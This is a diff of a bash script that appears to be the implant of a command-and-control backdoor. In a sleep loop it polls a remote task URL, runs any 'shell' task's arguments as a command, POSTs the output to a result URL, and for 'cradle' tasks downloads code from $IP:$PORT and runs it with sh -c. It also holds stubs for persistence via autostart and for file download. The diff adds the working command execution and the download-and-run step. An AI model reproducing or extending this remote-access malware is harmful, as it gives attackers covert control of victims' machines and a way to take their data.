@@ -16,35 +16,35 @@ do
     task=$(curl $taskurl)
     
     command=$(echo $task | awk -F' ' '{ print $1 }')
-    args=$(echo $task | awk -F' ' '{$1=""; print $0}')
+    args=$(echo $task | awk -F' ' '{$1=""; print $0}' | sed -e 's/^[ \t]*//') # trim whitespace
 
-    if [ -n "task" ]; then
-        
-        command=$(echo $task | awk -F' ' '{ print $1 }')
-        args=$(echo $task | awk -F' ' '{$1=""; print $0}')
+    if [ "$command" == "shell" ]; then
+        res=$($args)
+        curl -X POST --data "result=$res" -H "Content-Type: application/x-www-form-urlencoded" $resulturl
+    fi
 
-        if [ "$command" == "shell" ]; then
-            curl -X POST --data "result=$data" -H "Content-Type: application/x-www-form-urlencoded" $resulturl
-        fi
+    if [ "$command" == "cradle" ]; then
+        sh -c "$(curl http://$IP:$PORT/dl/$args)"
+        curl -X POST --data "result=$res" -H "Content-Type: application/x-www-form-urlencoded" $resulturl
+    fi
 
-        if [ "$command" == "rename" ]; then
-            echo ""
-            # TODO: rename agent
-        fi
+    if [ "$command" == "rename" ]; then
+        echo ""
+        # TODO: rename agent
+    fi
 
-        if [ "$command" == "persist" ]; then
-            echo ""
-            # TODO: save somewhere and add to autostart
-        fi
+    if [ "$command" == "persist" ]; then
+        echo ""
+        # TODO: save somewhere and add to autostart
+    fi
 
-        if [ "$command" == "download" ]; then
-            echo "" # TODO download
-        fi
-        
-        if [ "$command" == "terminate" ]; then
-            exit
-        fi
-    fi  
+    if [ "$command" == "download" ]; then
+        echo "" # TODO download
+    fi
+    
+    if [ "$command" == "terminate" ]; then
+        exit
+    fi
 
     sleep $sleeptime
 done
